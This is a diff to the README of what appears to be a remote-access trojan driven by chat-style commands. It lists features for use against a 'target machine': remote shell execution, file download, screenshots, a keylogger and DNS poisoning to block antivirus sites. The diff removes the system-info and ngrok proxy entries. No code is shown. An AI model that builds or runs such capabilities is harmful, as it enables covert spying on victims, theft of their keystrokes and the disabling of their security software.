@@ -23,8 +23,7 @@
   - `/download` - Downloads files.
 - **Shell Commands**: Execute shell commands remotely.
   - `/execute <SHELL_COMMAND>`
-- **System Info**: View system details.
-  - `/sys_info`
+
 - **Screenshot**: Take a screenshot of the target machine.
   - `/screenshot`
 - **File Management Commands**:
@@ -56,8 +55,6 @@
 ### Other
 - **Keylogger**: Start or stop keylogging.
   - `/start_keylogger`, `/stop_keylogger`
-- **Proxy**: Host a proxy with ngrok.
-  - `/start_proxy`, `/stop_proxy`
 - **DNS Poisoner**: Block or unblock domains, including AV sites.
   - `/block_av`, `/unblock_av`
   - `/block_domain <DOMAIN>`, `/unblock_domain <DOMAIN>`
